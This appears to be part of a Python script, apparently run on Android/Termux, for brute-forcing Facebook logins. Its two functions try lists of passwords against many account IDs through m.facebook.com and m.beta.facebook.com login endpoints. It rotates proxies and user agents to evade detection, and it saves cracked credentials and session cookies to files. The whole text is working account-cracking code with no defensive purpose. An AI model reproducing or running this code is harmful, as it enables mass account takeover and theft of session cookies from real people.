###----------[ ASYNC ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ VALIDATE ]----------###
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('/sdcard/AKUN-CP')
	except:pass
	login_baz()
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	memulai()
